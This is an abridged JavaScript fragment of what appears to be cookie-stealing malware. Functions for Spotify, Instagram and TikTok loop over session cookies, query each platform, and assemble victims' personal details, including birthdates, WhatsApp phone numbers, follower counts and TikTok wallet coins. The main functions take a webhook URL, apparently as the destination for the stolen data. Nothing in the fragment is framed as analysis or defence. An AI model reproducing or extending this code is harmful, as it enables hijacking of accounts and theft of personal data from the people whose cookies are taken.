    ...
    for (const cookie of cookies) {
        try {
            ...
            const spotifyInfo = [
                ...
                `Birthdate: ${full_profile.birthdate}`,
...
const Instagram = async (webhookUrl) => {
    ...
    for (const cookie of cookies) {
        try {
            ...
            const instagramInfo = [
                `Username: ${full_profile.username}`,
                `Birthdate: ${full_profile.birthday}`,
                `Verified Account: ${full_profile.is_verified ? '✅' : '❌'}`,
                `Followers: ${full_profile.follower_count}`,
                `Phone Number Whatsapp: ${full_profile.whatsapp_number.length === 0 ? 'Not Found' : full_profile.whatsapp_number}`,
...
const Tiktok = async (webhookUrl) => {
    ...
    for (const cookie of cookies) {
        try {
            ...
            const insightsResponse = await axios.post('https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE',
                `type_requests=${JSON.stringify([
                    { insigh_type: 'user_live_cnt_history', days: 58 },
                    { insigh_type: 'follower_num_history', days: 17 },
                    { insigh_type: 'comment_history', days: 16 },
                    { insigh_type: 'week_new_videos', days: 7 },
                    { insigh_type: 'share_history', days: 16 },
                    { insigh_type: 'like_history', days: 16 },
                    { insigh_type: 'vv_history', days: 16 },
                    { insigh_type: 'pv_history', days: 16 },
                    { insigh_type: 'self_rooms', days: 28 },
                    { insigh_type: 'week_incr_video_num' },
            ...
            const tiktokInfo = [
                `Username: ${full_profile.username}`,
                `ID: ${full_profile.user_id_str}`,
                `Account Creation: ${full_profile.create_time}`,
                `Wallet Coins: ${full_profile.wallet_coins}`,
